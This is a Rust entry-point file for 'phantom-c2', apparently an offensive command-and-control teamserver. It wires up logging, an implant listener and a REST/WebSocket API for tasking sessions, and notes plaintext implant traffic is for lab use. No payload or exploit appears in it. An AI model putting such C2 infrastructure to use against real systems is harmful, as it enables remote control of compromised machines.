// phantom-c2 — teamserver entry point
// Light (Neok1ra) — neok1ra@proton.me
//
// "This world is rotten, and those who are making it rot deserve to die."
//   — L's counter-argument still pending.
//
// started this because grimoire sovereign was embarrassingly fragile.
// raw tcp + readline is not a C2. this is.

use anyhow::Result;
use clap::Parser;
use tracing::{info, warn};

mod api;
mod banner;
mod cli;
mod error;
mod listener;
mod session;
mod task;

use cli::Cli;
use session::SessionStore;
use task::TaskQueue;

#[tokio::main]
async fn main() -> Result<()> {
    let cli = Cli::parse();

    // pretty logs — debug if -v, info otherwise
    // i kept accidentally missing errors without color, so trace is gated hard
    tracing_subscriber::fmt()
        .with_env_filter(if cli.verbose {
            "phantom=debug,tower_http=debug"
        } else {
            "phantom=info"
        })
        .with_target(false)
        .compact()
        .init();

    banner::print_banner();

    let sessions: SessionStore = session::new_store();
    let tasks: TaskQueue = TaskQueue::new();

    info!(
        bind = %cli.bind,
        api  = %cli.api_bind,
        tls  = cli.tls,
        "phantom teamserver starting"
    );

    if !cli.tls {
        warn!("TLS disabled — plaintext implant comms. lab use only.");
    }

    // spin up the implant listener and REST/WS API concurrently
    // if either dies we want the whole process to die — no silent half-dead server
    tokio::try_join!(
        listener::run(cli.bind.clone(), sessions.clone(), tasks.clone(), &cli),
        api::run(cli.api_bind.clone(), sessions.clone(), tasks.clone()),
    )?;

    Ok(())
}
// async TLS listener
